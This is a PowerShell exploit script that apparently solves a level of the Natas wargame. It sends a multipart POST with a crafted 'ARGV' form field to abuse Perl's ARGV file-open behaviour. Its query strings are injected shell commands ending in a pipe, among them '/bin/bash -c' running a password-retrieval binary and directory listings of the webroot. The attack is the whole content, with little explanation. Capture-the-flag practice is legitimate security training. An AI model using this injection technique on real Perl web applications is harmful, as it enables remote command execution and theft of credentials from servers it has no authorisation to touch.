using namespace Microsoft.PowerShell.Utility

param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$boundary = [System.Guid]::NewGuid().ToString()

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "multipart/form-data; boundary=$boundary"
}
#look: https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf

$filePath = 'data.csv'
$fileItem = Get-Item -Path $filePath


$body = "--$boundary`r`n"

$body += "Content-Disposition: form-data; name=`"file`"`r`n`r`n"
$body += "ARGV"
$body += "`r`n" 
$body += "--$boundary`r`n"

$body += "Content-Disposition: form-data; name=`"file`"; filename=`"$($fileItem.Name)`"`r`n"
$body += "Content-Type: $($fileItem.Extension)`r`n`r`n"
$body += Get-Content -Path $fileItem.FullName -Raw
$body += "`r`n"
$body += "--$boundary--`r`n"

$body

#/var/www/natas/natas29/index.pl

#$extraParam = '?ls -la /var/www/natas/natas32 |'
#$extraParam = '?file /var/www/natas/natas32/getpassword |'
$extraParam = "?/bin/bash -c '/var/www/natas/natas32/getpassword' |"
$extraParam = '?file -la /natas33/upload/myfilelol.php |'
#/natas33/upload/myfilelol.php
$response = Invoke-WebRequest -Headers $headers -URI ($url + $extraParam) -Method Post -Body $body
$response.Content

write-host `n$extraParam`n

if ($response.Content -like '*><th>*') {
    write-host `n"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH"`n
}

<#
Goal: "There is a binary in the webroot that you need to execute"

Webroot: /var/www/natas/                ???????????? is this correct?
#>